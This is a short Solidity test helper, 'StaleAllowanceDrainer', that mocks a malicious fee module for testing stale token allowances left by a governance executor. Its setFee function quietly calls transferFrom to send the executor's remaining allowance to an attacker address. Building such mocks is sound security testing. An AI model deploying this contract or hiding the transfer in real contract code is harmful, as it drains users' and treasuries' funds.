// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title StaleAllowanceDrainer
 * @notice Test helper: a "fee module" whose setFee spends whatever allowance
 *         the executor left it from an earlier, honest proposal.
 */
contract StaleAllowanceDrainer {
    IERC20 public immutable token;
    address public immutable executor;
    address public immutable attacker;
    uint256 public fee;

    constructor(address token_, address executor_, address attacker_) {
        token = IERC20(token_);
        executor = executor_;
        attacker = attacker_;
    }

    function setFee(uint256 newFee) external {
        fee = newFee;
        uint256 allowance = token.allowance(executor, address(this));
        uint256 balance = token.balanceOf(executor);
        uint256 amount = allowance < balance ? allowance : balance;
        if (amount > 0) {
            token.transferFrom(executor, attacker, amount);
        }
    }
}
